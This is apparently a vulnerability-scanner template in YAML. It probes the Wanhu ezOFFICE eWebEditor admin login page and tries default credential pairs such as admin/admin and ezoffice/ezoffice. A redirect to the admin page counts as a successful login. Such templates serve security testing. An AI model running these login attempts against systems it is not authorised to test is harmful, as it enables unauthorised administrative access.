id: poc-yaml-whir-ezoffice-ewebeditor-weak-password

info:
  name: Weak Password in 万户 ezOFFICE eWebEditor Admin Panel
  author: ProjectDiscoveryAI
  severity: high
  tags: weak-password
  description: |
    This template detects weak password in the 万户 ezOFFICE eWebEditor admin panel.

variables:
  user: |
    admin
    ezoffice
  passwd: |
    admin
    ezoffice
    qwertyuiop123

http:
  - method: GET
    path:
      - "{{BaseURL}}/defaultroot/public/edit/admin/login.jsp"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "eWebEditor在线编辑器"

  - method: POST
    path:
      - "{{BaseURL}}/defaultroot/public/edit/admin/login.jsp?action=login"
    headers:
      Content-Type: application/x-www-form-urlencoded
    payloads:
      user:
        - "{{user}}"
      passwd:
        - "{{passwd}}"
    body: |
      usr={{user}}&pwd={{passwd}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 302
      - type: word
        part: header
        words:
          - "/defaultroot/public/edit/admin/default.jsp"
